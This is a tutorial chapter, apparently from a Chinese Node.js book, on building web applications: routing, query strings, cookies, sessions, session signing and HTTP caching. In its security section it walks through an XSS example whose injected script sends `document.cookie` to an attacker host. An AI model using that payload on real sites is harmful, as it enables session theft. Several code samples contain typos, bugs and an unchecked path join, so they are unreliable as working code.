# 构建 Web 应用

---

如今看来，Web 应用俨然是互联网的主角，伴随 Web 1.0、Web 2.0 一路走来，HTTP 占据了网络中大多数流量。伴随着移动互联网时代的到来，Web 又开始在移动浏览器上发挥光和热。在 Web 标准化的努力过后，Web 又开始朝向应用化发展，JavaScript 在前端变得炙手可热。许多原本在服务端实现的业务细节，纷纷迁移到浏览器端，前端 MV\*的框架也日趋成熟。与之逆流的是，Node 的出现将前后端的壁垒再次打破，JavaScript 这门最初就能运行在服务器端的语言，在经历了前端的辉煌和后端的低迷后，借助事件驱动和 V8 的高性能，再次成为了服务器端的佼佼者。在 Web 应用中，JavaScript 将不再仅仅出现在前端浏览器中，因为 Node 的出现，“前端”将会被重新定义。

为了生仍 Web 应用的开发工作，各种语言、模式、框架层出不穷。单从框架而言，在后端数得出来的大名就有 Structs、CodeIgniter、Rails、Django、web.py 等，在前端也有知名的 BackBone、Knockout.js、AngularJS、Meteor 等。在 Node 中，又 Connect 中间件，也有 Express 这样的 MVC 框架。值得注意的是 Meteor 框架，他在后端是 Node，在前端是 JavaScript，它是一个融合了前后端 JavaScript 的框架。

由于前后端采用的语言都是 JavaScript，在跨越 HTTP 进行沟通是，会有一些额外的好处。

- 无需切换语言环境，部分知识不会因为语言环境的切换而丢失，上下文一致性较好。
- 数据（因为 JSON）可以很好地实现跨前后端直接使用。
- 一些业务（如模板渲染）可以很自由地轻量地选择是在前端还是在后端进行，因为编程语言相同，所以切换代价小。

本章会展开描述 Web 应用在后端实现中的细节和原理。

## 8.1 基础功能

在第七章，我们介绍了 Node 的网络编程部分。从中我们可以发现，Node 是十分贴近网络协议的，它的非阻塞、事件机制使得我们在网络编程时十分轻便。而本章的 Web 应用方面的内容，从 http 模块中的服务器端的 request 事件开始分析。request 事件发生于网络连接建立，客户端向服务器端发送报文，服务器端解析报文，发现 HTTP 请求的报头时。在已触发 request 事件前，它已经准备好 ServerRequest 和 ServerResponse 对象以供请求和响应包尔维尼操作。

以官方经典的 Hello World 为例，就是调用 ServerResponse 实现响应的：

```js
var http = require('http');
http
  .createServer(function (req, res) {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Hello World!');
  })
  .listen(1337, function () {
    console.log('Server running at http://127.0.0.1:1337/');
  });
```

对于一个 Web 应用而言，仅仅只是上面这样的响应远远达不到业务的需求。在具体的业务中，我们可能有如下这些需求。

- 请求方法的判断。
- URL 的路径解析。
- URL 中查询字符串解析。
- Cookie 的解析。
- Basic 认证。
- 表单数据的解析。
- 任意格式文件的上传处理。

除此之外，可能还有 Session（会话）的需求。尽管 Node 提供的底层 API 相对来说比较简单，但是要完成业务需求，还要大量的工作，仅仅一个 request 事件似乎无法满足这些需求。但是要实现这些需求也并非难事，一切的一切，都从这个函数展开：

```js
function (req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.end('Hello World');
}
```

在第四章中，我们曾对高阶函数有过简单的介绍：我们的应用可能无限地复杂，但是只要最终返回一个上面的函数作为参数，传递给`createServer()`方法作为 request 事件的侦听器就可以了。

你可能看到 Connect 或 Express 的示例中如下这样的代码：

```js
var app = connect();
// var app = express();

// TODO
http.createServer(app).listen(1337);
```

它的原理即是如此。我们具体业务开始之前，需要为业务预处理一些细节，这些细节将会挂载在 req 或 res 对象上，提供业务代码使用。

### 8.1.1 请求方法

在 Web 应用中，最常见的请求方法时 GET 和 POST，除此之外，还有 HEAD、DELETE、PUT、CONNETC 等发放。请求方法存在于报文的第一行的第一个单词，通常是大写。

HTTP_Parser 在解析请求报文的时候，将报文头抽取出来，设置 `req.method`。通常，我们需要处理 GET 和 POST 两类请求，但是 RESTful 类 Web 服务中请求方法十分重要，因为它会决定资源的操作行为。PUT 代表新建一个资源，POST 表示要更新一个资源，GET 表示查看一个资源，而 DELETE 表示删除一个资源。

我们通过请求方法来决定响应行为：

```js
function (req, res) {
  switch(req.method) {
    case 'POST':
      update(req, res);
      break;
    case 'DELETE':
      remove(req, res);
      break;
    case 'PUT':
      create(req, res);
      break;
    case 'GET':
    default:
      ret(req, res);
  }
}
```

上述代码代表了一种请求方法将复杂的业务逻辑分发的思路，是一种化繁为简的方式。

### 8.1.2 路径解析

除了根据请求方法来分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行第二部分。HTTP_Parser 将其解析为`req.url`。一般而言，完整的 URL 地址是这样的：

```sh
http://user:pass@host.com:8080/p/a/t/h?qeury=string#hash
```

客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放到报文第一行。需要注意的是，hash 部分会被丢弃，不会存在于报文的任何地方。

最常见的根据路径进行业务处理的应用是静态文件服务器，他会根据路径去查找磁盘的文件，然后将其响应给客户端：

```js
function (req, res) {
  var pathname = url.parse(req.url).pathname;
  fs.readFile(path.join(ROOT, pathname), function (err, file) {
    if(err) {
      res.writeHead(404);
      res.end('找不到相关文件。 - -');
      return;
    }
    res.writeHead(200);
    res.end(file);
  });
}
```

还有一种常见的分发场景是根据路径来选择控制器，它预设路径为控制器和行为的组合，无需额外配置路由信息，如下：

```sh
/controller/action/a/b/c
```

这里的 controller 会对应到一个控制器，action 对应到控制器的行为，剩余的值会作为参数进行一些别的判断：

```js
function (req, res) {
  var pathname = url.parse(req.url).pathname;
  var paths = pathname.split('');
  var controller = paths[1] || 'index';
  var action = paths[2] || 'index';
  var args = paths.slice(3);

  if(handles[controller] && handles[controller][action]) {
    handles[controller][action].apply(null, [req, res].concat(args));
  } else {
    res.writeHead(500);
    res.end('找不到相应控制器');
  }
}
```

这样我们的业务部分可以只关心具体的业务实现：

```js
handles.index = {};
handles.index.index = function (req, res, foo, bar) {
  res.writeHead(200);
  res.end(foo);
};
```

### 8.1.3 查询字符串

查询字符串位于路径之后，在地址栏中中路径之后的`?foo=bar&baz=val`字符串就是查询字符串。这个字符串会跟随在路径之后，形成请求报文首行的第二个部分。部分内容经常需要为业务逻辑所用，Node 提供了 querystring 模块用于处理这部分数据：

```js
var url = require('url');
var querystring = require('querystring');
var query = querystring.parse(url.pase(req.url).query);
```

更简洁的方法是给`url.parse()`传递第二个参数：

```js
var query = url.parse(req.url, true).query;
```

它会将`foo=bar&baz=val`解析成一个 JSON 对象：

```js
{
  foo: 'bar',
  baz: 'val'
}
```

在业务调用产生之前，我们的中间件或者框架会将查询字符串转换，然后挂载在请求对象上，供业务使用：

```js
function (req, res) {
  req.query = url.parse(req.url, true).query;
  hande(req, res);
}
```

要注意的点是，如果查询字符串中，键出现多次，那么它的值会是一个数组：

```js
// foo=bar*foo=baz
var query = url.parse(req.url, true).query;

// foo: ['bar', 'baz'];
```

业务的判断敌营要检查值是数组还是字符串，否则就可能出现 TypeError 异常的情况。

### 8.1.4 Cookie

#### 1.初识 Cookie

在 Web 应用中，请求路径和查询字符串对业务至关重要，通过它们已经可以进行很多业务操作了，但是 HTTP 是一个无状态的协议，现实中的业务确是需要一定的状态的，否则无法区分用户之间的身份。如何标识和认证一个用户，最早的方案就是 Cookie（曲奇饼）了。

Cookie 最早由文本浏览器 Lynx 合作开发者 Lou Montulli 在 1994 年网景公司开发 Netscape 浏览器的第一个版本时发明。它能记录服务器与客户端之间的状态，最早的用处就是用来判断用户是否第一次访问网站。在 1997 年形成规范 RFC 2109，目前最新规范时 RFC 6265，它是一个由浏览器和服务器共同协作实现的规范。

Cookie 的处理分为以下几步：

- 服务器向客户端发送 Cookie。
- 浏览器将 Cookie 保存。
- 之后每次请求浏览器都会将 Cookie 发向服务器端。

客户端发送的 Cookie 在请求报文的 Cookie 字段中，我们可以通过 curl 工具构造这个字段，如下：

```sh
curl -v -H "Cookie: foo=bar; barz=val" "http://127.0.0.1:1337/path?foo=bar&foo=baz"
```

HTTP_Parser 会将所有的报文字段解析到`req.headers`上，那么 Cookie 就是`req.headers.cookie`。根据规范的定义，Cookie 值得格式是`key=value; key2=value2`形式，如果我们需要 Cookie，解析他就十分容易了：

```js
var parseCookie = function (cookie) {
  var cookies = {};
  if (!cookie) return cookies;

  var list = cookie.split(';');
  for (var i = 0; i < list.length; i++) {
    var pair = list[i].split('=');
    cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
```

在业务逻辑代码执行之前，我们将其挂载在 req 对象上，让业务代码可以直接访问：

```js
function (req, res) {
  req.cookies = parseCookie(req.headers.cookie);
  hande(req, res);
}
```

这样我们得业务代码就可以判断处理了：

```js
var handle = function (req, res) {
  res.writeHead(200);
  if (!req.cookies.isVisit) {
    res.end('欢迎第一次来到动物园');
  } else {
    // TODO
  }
};
```

任何请求报文中，如果 Cookie 值没有 isVisit，都会收到“欢迎第一次来到动物园”这样的响应。这里提出一个问题，如果识别到用户没有访问过我们的站点，那么我们的站点是否该告诉客户端已经访问过的标识呢？告知客户端的方式是通过响应报文实现，响应的 Cookie 值在 set-Cookie 字段中，它的格式与请求中的格式不太相同，规范对它的定义如下：

```sh
set-Cookie: name=value; path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com;
```

其中`name=value`是必须包含的部分，其余部分皆是可选参数。这些可选参数将会影响浏览器在后续将 Cookie 发送给浏览器的行为。以下为主要的几个选项：

- path 表示这个 Cookie 影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个 Cookie。
- Expires 和 Max-Age 是用来告诉浏览器这个 Cookie 何时过期，如果不设置该选项，在关闭浏览器时会丢失这个 Cookie。
  如果设置了过期事件，浏览器会将 Cookie 内容写入到磁盘并保存，下次打开浏览器依旧有效。Expires 的值是一个 UTC 格式的时间字符串，告知浏览器此 Cookie 何时将过期，Max-Age 则告知浏览器此 Cookie 多久之后过期。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age 告知浏览器这条 Cookie 多久之后到期，而不是一个具体时间点。
- HttpOnly 告知浏览器不允许通过脚本 document.cookie 去更改这个 Cookie 值，事实上，设置 HTTP Only 之后，这个值在 document.cookie 中不可见。但是在 HTTP 请求的过程中，依然会发送这个 Cookie 到服务器端。

- Secure。当 Secure 值为 true 时，在 HTTP 中是无效的，在 HTTPS 中才有效，表示创建的 Cookie 只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以很难窃听到。

知道 Cookie 在报文中的具体个时候，下面我们将 Cookie 序列化成符合规范的字符串，相关代码：

```js
var serialize = function (name, val, opt) {
  var pairs = [name + '=' + encode(val)];
  opt = opt || {};
  if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
  if (opt.domain) pairs.push('Domain=' + opt.domain);
  if (opt.path) pairs.push('Path=' + opt.path);
  if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
  if (opt.httpOnly) pairs.push('HttpOnly');
  if (opt.secure) pairs.push('Secure');

  return pairs.join('; ');
};
```

略该前文的访问逻辑，我们就能轻松地判断用户的状态了，如下所示：

```js
var handle = function (req, res) {
  if (!req.cookies.isVisit) {
    res.setHeader('Set-Cookie', serialize('isVisit', '1'));
    res.writeHead(200);
    res.end('欢迎第一次来到动物园');
  } else {
    res.writeHead(200);
    res.end('欢迎回到动物园！');
  }
};
```

客户端收到这个带`Set-Cookie`的响应后，在之后的请求中会在 Cookie 字段中带上这个值。

值得注意的是，Set-Cookie 是较少的，在报头中可能存在多个字段。为此，`res.setHeader()`的第二个参数可以是一个数组：

```js
setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]);
```

这时会在报文头中形成两条 Set-Cookie 字段。

#### 2.Cookie 的性能影响

由于 Cookie 的实现机制，一旦服务器端向客户端发送了设置 Cookie 的意图，除非 Cookie 过期，否则客户端每次请求都会发送 Cookie 到服务器端，一旦设置 Cookie 过多，将会导致报头较大。大多数 Cookie 并不需要每次都用上，因为这会造成带宽的部分浪费。在 YSlow 的性能优化规则中有这么一条：

- 减小 Cookie 的大小

  更严重的情况是，如果在域名的根节点设置 Cookie，几乎所有子路径下的请求都会带上这些 Cookie，这些 Cookie 在某些情况下是有用的，但是在有些情况下是完全无用的。其中以静态文件最为典型，静态文件到业务定位几乎不关心状态，Cookie 对它而言几乎是无用的，但是一旦有 Cookie 设置到相同域下，它的请求中就会带上 Cookie。好在 Cookie 的设计时限定了它的域，只有域名相同时才发送。所以 YS low 中有另一条规则用来避免 Cookie 带来的性能影响。

- 为静态组件使用不同的域名

  简而言之就是，为不需要 Cookie 的组件换个域名可以实现减少无效 Cookie 的传输。所以很多网站的静态文件会有特别的域名，使得业务相关的 Cookie 不再影响静态资源。当然换用额外的域名带来的好处不止这点，还可以突破浏览器下载线程数量的限制，因为域名不同，可以将下载线程翻倍。但是换用额外域名还是有一定的缺点，那就是将域名转换为 IP 需要进行 DNS 查询，多一个域名就多一次 DNS 查询。YSlow 中有这样一条规则：

- 减少 DNS 查询

  看起来减少 DNS 查询和使用不同域名是冲突的两条规则，但是好在现金的浏览器都会进行 DNS 缓存，以削弱这个副作用的影响。

Cookie 除了通过后端添加协议头的字段设置外，在前端浏览器中也可以通过 JavaScript 进行修改，浏览器将 Cookie 通过 document.cookie 暴露给 JavaScript。前端在修改 Cookie 后，后续的网络请求中就会携带上修改后的值。

目前，广告和在线统计领域最为依赖 Cookie，通过嵌入第三方的广告和统计脚本，将 Cookie 和当前页面绑定，这样就可以标识用户，得到用户的浏览行为，广告商就可以定向投放广告了。尽管这样的行为看起来可怕，但是从 Cookie 的原理来说，它只能左到标识，而不能做任何具有破坏性的事情。如果依然担心自己站点的用户被记录行为，那就不要挂任何第三方脚本。

### 8.1.5 Session

通过 Cookie，浏览器和服务器可以实现状态的记录。但是 Cookie 并非完美的，前文提及的体积过大就是一个显著的问题，最为严重的问题是 Cookie 可以在前后端进行修改，因此数据就极容易被篡改和伪造。如果服务器端有部分逻辑根据 Cookie 的 isVIP 字段进行判断，那么一个普通用户通过修改 Cookie 就可以轻松享受 VIP 服务了。综上所述，Cookie 对于敏感数据的保护是无效的。

为了解决 Cookie 敏感数据的问题，Session 应运而生。Session 的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到一定的保障，数据也无需在协议中每次都被传递。

虽然服务器端存储数据十分方便，但是如何将每个客户和服务器的数据一一对应起来，这里有常见的两种实现方式：

- 第一种：基于 Cookie 来实现用户和数据的映射

  虽然将所有数据放在 Cookie 中不可取，但是将口令放在 Cookie 中还是可以的。因为口令一旦被篡改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且 Session 的有效期通常较短，普遍设置为 20 分钟，如果 20 分钟内客户端和服务器端没有交互产生，服务器端就会将数据删除。由于数据过期时间较短，且在服务器端存储数据，因此安全性相对较高。那么口令是如何产生的呢？

  一旦服务器端启用了 Session，它将约定一个键值作为 Session 的口令，这个值可以随意约定，比如 Connect 默认采用 connect_uid，Tomcat 会采用 jsessionid 等。一旦服务器检查用户请求 Cookie 中没有携带该值，他就会为之生成一个值，这个值是唯一且不重复的值，并设定超时时间。以下为生成 Session 的代码：

  ```js
  var sessions = {};
  var key = 'session_id';
  var EXPIRES = 20 * 60 * 1000;

  var generate = function () {
    var session = {};
    session.id = new Date().getTime() + Math.random();
    session.cookie = {
      expire: new Date().getTime() + EXPIRES,
    };

    sessions[session.id] = session;
    return session;
  };
  ```

  每个请求到来时，检查 Cookie 的口令与服务器端的数据，如果过期，就重新生成：

  ```js
  function (req, res) {
    var id = req.cookies[key];

    if(!id) {
      req.session = generate();
    } else {
      var session  = session[id];
      if(session) {
        if(session.cookie.expire > (new Date()).getTime()) {
          // 更新超时时间
          session.cooke.expire = (new Date()).getTime + EXPIRES;
          req.session = session;
        } else {
          // 超时，删除旧数据，并重新生成
          delete sessions[id];
          req.session = generate();
        }
      } else {
        // 如果session 过期或口令不对，重新生成session
        req.session = generate();
      }
    }

    handle(req, res);
  }
  ```

  当然仅仅重新生成 Session 还不足以完成整个流程，还需要在响应客户端时设置新的值，以便下次请求时能够对应服务器端的数据，这里我们 hack 响应对象的`writeHead()`方法，在它内部注入设置 Cookie 的逻辑：

  ```js
  var writeHead = res.writeHead;

  res.writeHead = function () {
    var cookies = res.getHeader('Set-Cookie');
    var session = serialize('Set-Cookie', req.session.id);
    cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
    res.setHeader('Set-Cookie', cookies);
    return writeHead.apply(this, arguments);
  };
  ```

  至此，session 在前后端进行对应的过程就完成了。这样的业务逻辑可以判断和设置 session，一次来维护用户与服务器端的关系：

  ```js
  var handle = function (req, res) {
    if (!req.session.isVisit) {
      res.session.isVisit = true;
      res.writeHead(200);
      res.end('欢迎第一次来到动物园');
    } else {
      res.writeHead(200);
      res.end('动物园再次欢迎你');
    }
  };
  ```

  这样在 session 中保存的数据比直接在 Cookie 中保存数据要安全得多。这种实现方案依赖 Cookie 实现，而且也是目前大多数 Web 应用的方案。如果客户端禁止使用 Cookie，这个时间上大多数的网站将无法实现登录等操作。

- 第二种：通过查询字符串来实现浏览器端和服务器端数据的对应

  它的原理时间差请求的查询字符串，如果没有值，会先生成新的带值的 URL：

  ```js
  var getURL = function (_url, key, value) {
    var obj = url.parse(_url, true);
    obj.query[key] = value;
    return url.format(obj);
  };
  ```

  然后形成跳转，让客户端重新发起请求：

  ```js
  function (req, res) {
    var redirect = function (url) {
      res.setHeader('Location', url);
      res.writeHead(302);
      res.end();
    };

    var id = req.query[key];

    if(!id) {
      var session = generate();
      redirect(getURL(req.url, key, session.id));
    } else {
      var session = sessions[id];
      if(session) {
        if(session.cookie.expire > (new Date()).getTime()) {
          // 更新超时时间
          session.cookie.expire = (new Date()).getTime() + EXPIRES;
          req.session = session;
          handle(req, res);
        } else {
          // 超时，删除旧数据，并重新生成
          delete sessions[id];
          var session = generate();
          redirect(getURL(req.url, key, session.id));
        }
      } else {
        // session 过期或口令不对
        var session = generate();
        redirect(getURL(req.url, key, session.id));
      }
    }
  }
  ```

  用户访问`http://localhost/pathname`时，如果服务器端发现查询字符串中不带 session_id 参数，将会将用户跳转到`http://localhost/pathname?session_id=1234567`这样类似的地址。如果浏览器收到 302 状态码和 Location 报头，就会重新发起新的请求。这样新的请求到来时就能通过 Session 的检查，除非呢村中的数据过期。

  有的服务器在客户端禁用 Cookie 时，会采用这种方案实现退化。通过这种方案，无需再响应时设置 Cookie。但是这种方案带来的风险远大于基于 Cookie 实现的风险，因为只要将地址栏中的地址发给另一个人，那么他就拥有跟你同样的身份。Cookie 的方案在换了浏览器或者换了电脑之后就无法生效，相对较为安全。

还有一种比较有趣的处理 Session 的方式是利用 HTTP 请求头中的 ETag，同样对于更换浏览器和电脑后也是无效的，具体细节这里就不展开了，感兴趣的朋友可以到往上查阅相关资料。

#### 1. Session 与内存

在上面的示例代码中，我们都将 Session 数据直接存在变量 sessions 中，它位于内存中中。然而在第五章内存控制部分，我们分析了为什么 Node 会存在内存限制。这里将数据存放在内存中，将带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。

另一个问题则是我们可能为了利用多核 CPU 而启动多个进程，这个细节在第九章中详细描述。用户请求的连接将可能随意分配搭配各个进程中，Node 的进程与进程之间是不能共享内存的，用户的 Session 可能会引起错乱。

为了解决性能问题和 Session 数据无法跨进程共享的问题，常用的方案就是将 Session 集中化，将原本分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是 Redis、Memcached 等，通过这些高效的缓存，Node 进程无需在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些告诉缓存设计的缓存过期策略更合理更高效，比在 Node 中自行设计缓存策略更好。

采用第三方缓存来存储 Session 引起的一个问题是会引起网络访问。理论上来说，访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘 I/O 等，尽管如此但依然会采用这些高速缓存的理由有以下几条：

- Node 与缓存服务保持长连接，而非频繁的短链接，握手导致的延迟只影响初始化。
- 高速缓存直接在内存中进行数据存储和访问。
- 缓存服务通常与 Node 进程运行在相同机器上或者相同的机房里，网络速度收到的影响较小。

尽管采用专门缓存服务会比直接在内存中访问慢，但其影响小之又小，带来的好处却远远大于直接在 Node 中缓存数据。

为此，一旦 Session 需要异步的方式获取，代码就需要略作调整，变成异步的方式：

```js
function (req, res) {
  var id = req.cookies[key];

  if(!id) {
    req.session = generate();
    handle(req, res);
  } else {
    store.get(id, function (err, session) {
      if(session) {
        if(session.cookie.expire > (new Date()).getTime()) {
          // 更新超时时间
          session.cookie.expire = (new Date()).getTime + EXPIRES;
          req.session = session;
        } else {
          // 超时，删除旧数据，并重新生成
          delete session[id];
          req.session = generate();
        }
      } else {
        // 过期或者口令不对，重新生成
        req.session = generate();
      }
      handle(req, res);
    });
  }
}
```

在响应时，将新的 session 保存会缓存中：

```js
var writeHead = res.writeHead;

res.writeHead = function () {
  var cookies = res.getHeader('Set-Cookie');
  var session = serialize('Set-Cookie', req.session.id);
  cookies = Array.isArray(cookies) ? coolies.concat(session) : [cookies, session];

  res.setHeader('Set-Cookie', cookies);

  // 保存回缓存
  store.save(req.session);
  return writeHead.apply(this, arguments);
};
```

#### 2.Session 与安全

从前文可以知道，尽管我们数据都放置在后端了，使得它能保障安全，但是无论通过 Cookie，还是查询字符串的实现，Session 的口令依然保存在客户端，这里回存在口令被盗用的情况。如果 Web 应用的用户十分多，自行设计的随机算法的一些口令之就有理论机会命中有效的口令之。一旦口令被伪造，服务器端的数据可能被间接利用。这里提到的 Session 的安全，就主要指如何让这个口令更加安全。

有一种做法是将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令之，但是由于不知道四幺之，签名信息很难伪造。如此，我们只要在响应时将口令和签名进行对比，如果签名非法，我们将服务器端的数据立即过期即可：

```js
// 将指通过私钥签名，由.分割原值和签名
var sign = function (val, secret) {
  return (
    val + '.' + crypto.createHmac('sha256', secret).update(val).digest('base64').replace(/\=+$/, '')
  );
};
```

在响应时，设置 session 的值到 Cookie 中或者跳转 URL 中：

```js
var val = sign(req.sessionID, secret);
res.setHeader('Set-Cookie', cookie.serialize(key, val));

// 接收请求时，检查签名：

var unsing = function (val, secret) {
  var str = val.slice(0, val.lastIndexOf('.'));
  return sign(str, secret) == val ? str : false;
};
```

这样依赖，即使攻击者知道口令中.号前的值时服务器端 Session 的 ID 值，只要不知道 secret 私钥的值，就无法伪造签名信息，以此实现对 Session 的保护。该方法被 Connect 中间件框架所使用，保护好私钥，就是在保障自己 Web 应用的安全。

当然，将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，它们就能实现身份的伪装。一种发难是将客户端的某些都有信息与口令作为原值，然后签名，这样攻击者一旦不再原始客户端上进行访问，就会导致签名失败。这些都有信息包括用户的 IP 和用户代理（User Agent）。

但是原始用户与攻击者之间也存在上述信息相同的可能性，如局域网出口 IP 相同，相同的客户端信息等，不过纳入这些考虑能够提高安全性。通常而言，将口令存在 Cookie 中不容易被他人获取，但是一些别的漏洞可能导致这个口令泄漏，典型的由 XSS 楼的那个，下面简单介绍以下如何通过 XSS 拿到用户的口令，实现伪造。

- XSS 漏洞

XSS 的全程是跨站脚本攻击（Cross Site Scripting，通常简称为 XSS），通常都是由网站开发者决定哪些脚本可以执行在浏览器端，不过 XSS 漏洞会让别的脚本执行。它的主要形成原因多数是用户的输入没有被转义，而被直接执行。

下面是某个网站的前端脚本，它会将 URL hash 中的值设置到页面中，以实现某种逻辑：

```js
$('#box').html(location.hash.replace('#', ''));
```

攻击者发现这个漏洞后，构造了这样一个 URL：

```sh
http://a.com/pathname#<script src="http://b.com/c.js"></script>
```

为了不让受害者直接发现这段 URL 中的猫腻，他可能会通过 URL 压缩成一个短网址，如下：

```sh
http://t.cn/fasdlfj
# 或再次压缩
http://url.cn/fasdlfb
```

然后将最终的短网址发送给某个登录的在线用户。这样依赖，这段 hash 中的脚本将会在这个用户的浏览器中执行，而这段脚本的内容如下：

```js
location.href = 'http://c.com/?' + document.cookie;
```

这段代码将该用户的 Cookie 提交给了`c.com`站点，这个站点就是攻击者的服务器，他也能拿到该用户的 Session 口令。然后他在客户端中用这个口令伪造 Cookie，从而实现了伪装用户的身份。如果该用户是网站管理员，就可能造成极大的危害。

XSS 造成的危害远远不止这些，这里就不再过多介绍。在这个案例中，如果口令中有用户的客户端信息的签名，即使口令被泄露，除非攻击者与用户客户端完全相同，否则不能实现伪造。

### 8.1.6 缓存

我们知道软件的架构经历过一次 C/S 模式到 B/S 模式的演变，在 HTTP 之上构建的应用，其客户端除了比普通桌面应用具备更轻量级的升级和部署等特性之外，在跨平台、跨浏览器、跨设备上也具备独特的优势。传统客户端在安装后的应用过程中仅仅传输数据，Web 应用还需要传输构成界面的组件（HTML、JavaScript、CSS 文件等）。这部分内容在大多数场景下并不经常变更，却需要在每次的应用中向客户端传递，如果不进行处理，那么它将造成不必要的带宽浪费。如果网络速度交叉，就需要花费更多时间来打开页面，对于用户体验就会造成一定的影响。因此节省不必要的传输，对用户和对服务提供者来说都有好处。

为了提供性能，YSlow 中也提到几条关于缓存的规则。

- 添加 Expires 或 Cache-Control 到报文头中。
- 配置 ETags。
- 让 Ajax 可缓存。

这里我们展开这几条规则的来源。如果让浏览器缓存我们的静态资源，这也是一个需要由服务器和浏览器共同协作完成的事情。RFC 2616 规范对此有一定的描述，只有遵循约定，整个缓存机制才能有效建立。通常来说，POST、DELETE、PUT 这类带来行为性的请求操作一般不做任何缓存，大多数缓存只应用在 GET 请求中。

简单来说，本地没有文件时，浏览器必然会请求服务器端的内容，并将这部分内容放置在本地的某个缓存目录中。在第二次请求时，它将本地文件进行检查，如果不能确定这份本地文件是否可以直接使用，它将发起一次条件请求。所谓条件请求就是普通的 GET 请求报文中，附带一个 If-Modified-Since 字段。

它将询问服务器端是否有更新的版本，本地文件的最后修改时间。如果服务器端没有新的版本，只需响应一个 304 状态码，客户端就使用本地版本。如果服务器端有新的版本，就将新的内容发送给客户端，客户端放弃本地版本。

```js
var handle = function (req, res) {
  fs.stat(filename, function (err, stat) {
    var lastModified = state.mtime.toUTCString();
    if (lastModified === req.headers['if-modified-since']) {
      res.writeHead(304, 'Not Modified');
      res.end();
    } else {
      fs.readFile(filename, function (err, file) {
        var lastModified = state.mtime.toUTCString();
        res.setHeader('Last-Modified', lastModified);
        res.writeHead(200, 'Ok');
        res.end(file);
      });
    }
  });
};
```

这里的条件请求采用时间戳的方式实现，但是时间戳有一些缺陷存在。

- 文件的时间戳改动但内容并不一定改动。
- 时间戳只能精确到秒级别，更新频繁的内容将无法生效。

为此 HTTP1.1 中引入了 ETag 来解决这个问题。ETag 的全称是 Entity Tag，由服务器端生成，服务器端可以决定它的生成规则。如果根据文件内容生成散列值，那么条件请求将不会受到时间戳改动的带宽浪费:

```js
var getHash = function (str) {
  var shasum = crypto.createHash('sha1');
  return shasum.update(str).digest('base64');
};

// 与If-Modified-Since/Last-Modified 不同的是，ETag的请求和响应是If-None-Match/ETag

var handle = function (req, res) {
  fs.readFile(filename, function (err, file) {
    var hash = getHash(file);
    var noneMatch = req['if-none-match'];
    if (hash === noneMatch) {
      res.writeHead(304, 'Not Modified');
      res.end();
    } else {
      res.setHeader('ETag', hash);
      res.writeHead(200, 'Ok');
      res.end(file);
    }
  });
};
```

浏览器在收到`ETag: "83-1359871272000"`这样的请求后，下次请求时，会将其放置在请求头中：`If-Node-Match: "83-1359871272000"`。

尽管条件请求可以在文件内容没有修改的情况下节省带宽，但是它依然会发起一个 HTTP 请求，使得客户端依然花费一定时间来等待响应。可见最好的方案就是连条件请求都不用发起。那么如何让浏览器知晓是否能直接使用本地版本？答案就是服务器端在响应内容时，让浏览器明确地将内容缓存起来。如同 YSlow 规则里提到，在响应里设置 Expires 或 Cache-Control 头，浏览器根据该值进行缓存，那么这两个值有何区别呢？

HTTP 1.0 时，在服务器端设置 Expires 可以告知浏览器要缓存文件内容：

```js
var handle = function (req, res) {
  fs.readFile(filename, function (err, file) {
    var expires = new Date();
    expires.setTime(expires.getTime() + 10 * 365 * 24 * 60 * 60 * 1000);
    res.setHeader('Expires', expires.toUTCString());
    res.writeHead(200, 'Ok');
    res.end(file);
  });
};
```

Expires 是一个 GMT 格式的时间字符串。浏览器在接到这个过期值后，只要本地还存在这个缓存文件，在到期时间之前它都不会发起再请求。YUI3 的 CDN 实践是缓存文件在 10 年以后过期。但是 Expires 的缺陷在于浏览器与服务器之间的时间可能不一致，这可能带来一些问题，比如文件提前过期，或者到期后并没有删除。在这种情况下 Cache-Control 以更丰富的形式，实现相同的功能。

```js
var handle = function (req, res) {
  fs.readFile(filename, function (err, file) {
    res.setHeader('Cache-Control', 'max-age=' + 10 * 365 * 24 * 60 * 60 * 1000);
    res.writeHead(200, 'Ok');
    res.end(file);
  });
};
```

上面的代码为 Cache-Control 设置了 max-age 值，它比 Expires 优秀的地方在于，Cache-Control 能避免浏览器端和服务器端时间不一致问题，只要进行类似倒计时的方式计算过期时间即可。除此之外，Cache-Control 的值还能设置 public、private、no-cache、no-store 等能够更精细控制缓存的选项。

由于在 HTTP 1.0 时，还不支持 max-age，如今的服务器端在模块的支持下多半同时对 Expires 和 Cache-Control 进行支持。在浏览器中如果两个值同时存在，且被同时支持时，max-age 会覆盖 Expires。

- 清除缓存

  虽然我们知晓了如何设置缓存，以达到节省网络带宽的目的，但是缓存一旦设定，当服务器意外更新内容时，却无法通知客户端有新更新时，我们就让浏览器发起新的 URL 请求，使得新内容能够被客户端更新。一般的更新机制有两种：

  - 每次发布，路径中跟随 Web 应用的版本号： `http://url.com/?v=20130501`。
  - 每次发布，路径中跟随文件内容的 hash 值：`http://url.com/?hash=afadfadwe`。

